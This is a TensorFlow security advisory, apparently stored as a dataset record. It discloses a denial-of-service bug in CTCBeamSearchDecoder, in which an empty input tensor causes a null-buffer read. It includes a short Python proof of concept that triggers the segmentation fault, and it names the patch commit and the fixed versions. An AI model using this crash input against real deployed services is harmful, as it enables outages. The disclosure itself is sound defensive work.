{"description": "### Impact\nDue to lack of validation in `tf.raw_ops.CTCBeamSearchDecoder`, an attacker can trigger denial of service via segmentation faults:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[18, 8, 0], dtype=tf.float32)\nsequence_length = tf.constant([11, -43, -92, 11, -89, -83, -35, -100],\nshape=[8], dtype=tf.int32)\nbeam_width = 10\ntop_paths = 3\nmerge_repeated = True\n\ntf.raw_ops.CTCBeamSearchDecoder(\n  inputs=inputs, sequence_length=sequence_length, beam_width=beam_width,\n  top_paths=top_paths, merge_repeated=merge_repeated)\n``` \n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/a74768f8e4efbda4def9f16ee7e13cf3922ac5f7/tensorflow/core/kernels/ctc_decoder_ops.cc#L68-L79) fails to detect cases when the input tensor is empty and proceeds to read data from a null buffer.\n  \n### Patches\nWe have patched the issue in GitHub commit [b1b323042264740c398140da32e93fb9c2c9f33e](https://github.com/tensorflow/tensorflow/commit/b1b323042264740c398140da32e93fb9c2c9f33e).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.", "methods": ["Triggered a segmentation fault via a lack of validation in `tf.raw_ops.CTCBeamSearchDecoder`.", "Failed to detect empty input tensors, leading to reading from a null buffer."]}
